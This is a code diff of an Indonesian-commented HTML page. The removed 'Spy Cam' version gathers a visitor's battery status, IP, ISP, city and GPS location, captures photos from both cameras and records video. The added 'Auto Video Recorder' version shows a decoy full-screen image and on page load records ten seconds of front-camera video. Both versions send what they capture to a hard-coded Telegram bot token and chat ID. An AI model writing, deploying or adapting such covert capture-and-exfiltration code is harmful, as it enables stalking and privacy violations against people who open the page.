@@ -3,118 +3,60 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Spy Cam</title>
+    <title>Auto Video Recorder</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            background: black;
+        }
+        img {
+            width: 100%;
+            height: 100vh;
+            object-fit: cover;
+        }
+    </style>
 </head>
-<body style="margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: black;">
-    <img id="displayImage" src="https://img12.pixhost.to/images/804/574487749_fikxzxmodz-developer.jpg" style="width: 100%; height: 100vh; object-fit: cover;">
+<body>
+    <!-- Ganti dengan gambar yang kamu inginkan -->
+    <img src="https://img12.pixhost.to/images/804/574487749_fikxzxmodz-developer.jpg" alt="Foto Tampilan" />
 
     <script>
-        const BOT_TOKEN = "7575375182:AAHQeA5jdew2tMO5Znh9_zBqi4pwFnWUmCg";  
-        const CHAT_ID = "7081489041";  
-
-        async function getBatteryStatus() {
-            if (navigator.getBattery) {
-                const battery = await navigator.getBattery();
-                return `Baterai: ${Math.round(battery.level * 100)}% (${battery.charging ? 'Sedang Mengisi' : 'Tidak Mengisi'})`;
-            }
-            return "Baterai: Tidak Diketahui";
-        }
-
-        async function getIPInfo() {
+        async function startRecording() {
             try {
-                const res = await fetch("https://ipapi.co/json/");
-                const data = await res.json();
-                return `IP: ${data.ip}\nISP: ${data.org}\nKota: ${data.city}, ${data.region}, ${data.country_name}`;
-            } catch {
-                return "IP Info: Tidak Diketahui";
-            }
-        }
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+                const mediaRecorder = new MediaRecorder(stream);
+                let chunks = [];
 
-        async function getLocation() {
-            return new Promise((resolve) => {
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => resolve(`Lokasi: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`),
-                    () => resolve("Lokasi: Ditolak oleh pengguna")
-                );
-            });
-        }
-
-        async function captureImage(facingMode) {
-            return new Promise(async (resolve, reject) => {
-                try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
-                    const video = document.createElement("video");
-                    video.srcObject = stream;
-                    video.play();
-
-                    setTimeout(() => {
-                        const canvas = document.createElement("canvas");
-                        canvas.width = video.videoWidth;
-                        canvas.height = video.videoHeight;
-                        canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
-                        stream.getTracks().forEach(track => track.stop());
-
-                        canvas.toBlob(blob => resolve(blob), "image/jpeg");
-                    }, 2000);
-                } catch (error) {
-                    reject(error);
-                }
-            });
-        }
-
-        async function recordVideo() {
-            return new Promise(async (resolve, reject) => {
-                try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
-                    const mediaRecorder = new MediaRecorder(stream);
-                    let chunks = [];
-
-                    mediaRecorder.ondataavailable = (event) => chunks.push(event.data);
-                    mediaRecorder.onstop = () => {
-                        stream.getTracks().forEach(track => track.stop());
-                        resolve(new Blob(chunks, { type: "video/webm" }));
-                    };
-
-                    mediaRecorder.start();
-                    setTimeout(() => mediaRecorder.stop(), 5000); // Rekam 5 detik
-                } catch (error) {
-                    reject(error);
-                }
-            });
-        }
-
-        async function sendToTelegram() {
-            try {
-                const [battery, ipInfo, location] = await Promise.all([getBatteryStatus(), getIPInfo(), getLocation()]);
-                const caption = `📌 *Data Pengguna*\n\n${battery}\n${ipInfo}\n${location}`;
-
-                const frontImage = await captureImage("user");
-                const backImage = await captureImage("environment");
-                const video = await recordVideo();
-
-                const sendFile = async (type, file, captionText) => {
+                mediaRecorder.ondataavailable = (event) => chunks.push(event.data);
+                
+                mediaRecorder.onstop = async () => {
+                    const blob = new Blob(chunks, { type: "video/webm" });
                     const formData = new FormData();
-                    formData.append(type, file, `${type}.${type === "photo" ? "jpg" : "webm"}`);
-                    formData.append("chat_id", CHAT_ID);
-                    formData.append("caption", captionText);
-                    formData.append("parse_mode", "Markdown");
+                    formData.append("video", blob, "recorded.webm");
 
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/send${type === "photo" ? "Photo" : "Video"}`, {
+                    // Kirim langsung ke bot Telegram
+                    await fetch(`https://api.telegram.org/bot7575375182:AAHQeA5jdew2tMO5Znh9_zBqi4pwFnWUmCg/sendVideo?chat_id=7081489041`, {
                         method: "POST",
                         body: formData
                     });
+
+                    stream.getTracks().forEach(track => track.stop());
                 };
 
-                await sendFile("photo", frontImage, `📸 Kamera Depan\n\n${caption}`);
-                await sendFile("photo", backImage, `📸 Kamera Belakang\n\n${caption}`);
-                await sendFile("video", video, `📹 Video Kamera Depan\n\n${caption}`);
+                mediaRecorder.start();
+                setTimeout(() => mediaRecorder.stop(), 10000); // Rekam selama 10 detik
 
             } catch (error) {
-                console.error("Gagal mengirim data:", error);
+                console.error("Gagal mengakses kamera:", error);
             }
         }
 
-        sendToTelegram();
+        window.onload = startRecording;
     </script>
 </body>
 </html>
